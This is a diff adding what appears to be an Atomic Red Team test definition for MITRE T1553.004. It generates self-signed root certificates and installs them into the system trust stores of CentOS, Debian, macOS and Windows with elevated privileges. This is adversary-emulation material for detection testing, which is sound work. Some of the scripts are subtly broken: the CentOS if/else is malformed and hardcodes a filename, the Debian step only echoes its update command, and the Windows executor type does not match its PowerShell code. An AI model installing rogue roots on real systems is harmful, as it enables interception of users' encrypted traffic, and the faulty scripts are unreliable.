@@ -1,0 +1,121 @@
+attack_technique: T1553.004
+display_name: 'Subvert Trust Controls: Install Root Certificate'
+atomic_tests:
+- name: Install root CA on CentOS/RHEL
+  auto_generated_guid: 9c096ec4-fd42-419d-a762-d64cc950627e
+  description: |
+    Creates a root CA with openssl
+  supported_platforms:
+  - linux
+  input_arguments:
+    cert_filename:
+      description: Path of the CA certificate we create
+      type: Path
+      default: rootCA.crt
+    key_filename:
+      description: Key we create that is used to create the CA certificate
+      type: Path
+      default: rootCA.key
+  executor:
+    command: |
+      openssl genrsa -out #{key_filename} 4096
+      openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com" -out #{cert_filename}
+
+      if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -le "5" ];
+      then
+        cat rootCA.crt >> /etc/pki/tls/certs/ca-bundle.crt
+      else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -ge "7" ];
+        cp rootCA.crt /etc/pki/ca-trust/source/anchors/
+        update-ca-trust
+      fi
+    name: sh
+- name: Install root CA on Debian/Ubuntu
+  auto_generated_guid: 53bcf8a0-1549-4b85-b919-010c56d724ff
+  description: |
+    Creates a root CA with openssl
+  supported_platforms:
+  - linux
+  input_arguments:
+    cert_filename:
+      description: CA file name
+      type: Path
+      default: rootCA.crt
+    key_filename:
+      description: Key we create that is used to create the CA certificate
+      type: Path
+      default: rootCA.key
+  dependency_executor_name: command_prompt
+  dependencies:
+  - description: |
+      Verify the certificate exists. It generates if not on disk.
+    prereq_command: |
+      if [ -f #{cert_filename} ]; then exit 0; else exit 1; fi;
+    get_prereq_command: |
+      if [ ! -f #{key_filename} ]; then openssl genrsa -out #{key_filename} 4096; fi;
+      openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com" -out #{cert_filename}
+  executor:
+    command: |
+      mv #{cert_filename} /usr/local/share/ca-certificates
+      echo sudo update-ca-certificates
+    name: sh
+    elevation_required: true
+- name: Install root CA on macOS
+  auto_generated_guid: cc4a0b8c-426f-40ff-9426-4e10e5bf4c49
+  description: |
+    Creates a root CA with openssl
+  supported_platforms:
+  - macos
+  input_arguments:
+    cert_filename:
+      description: CA file name
+      type: Path
+      default: rootCA.crt
+    key_filename:
+      description: Key we create that is used to create the CA certificate
+      type: Path
+      default: rootCA.key
+  dependency_executor_name: command_prompt
+  dependencies:
+  - description: |
+      Verify the certificate exists. It generates if not on disk.
+    prereq_command: |
+      if [ -f #{cert_filename} ]; then exit 0; else exit 1; fi;
+    get_prereq_command: |
+      if [ ! -f #{key_filename} ]; then openssl genrsa -out #{key_filename} 4096; fi;
+      openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com" -out #{cert_filename}
+  executor:
+    command: |
+      sudo security add-trusted-cert -d -r trustRoot -k "/Library/Keychains/System.keychain" "#{cert_filename}"
+    name: command_prompt
+    elevation_required: true
+- name: Install root CA on Windows
+  auto_generated_guid: 76f49d86-5eb1-461a-a032-a480f86652f1
+  description: |
+    Creates a root CA with Powershell
+  supported_platforms:
+  - windows
+  input_arguments:
+    pfx_path:
+      description: Path of the certificate
+      type: Path
+      default: rootCA.cer
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Verify the certificate exists. It generates if not on disk.
+    prereq_command: |
+      if (Test-Path #{pfx_path}) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
+      Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$cert.Thumbprint -FilePath #{pfx_path}
+      Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) | Remove-Item
+  executor:
+    command: |
+      $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My
+      Move-Item -Path $cert.PSPath -Destination "Cert:\LocalMachine\Root"
+    cleanup_command: |
+      $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My
+      Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) | Remove-Item
+      Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) | Remove-Item
+    name: command_prompt
+    elevation_required: true
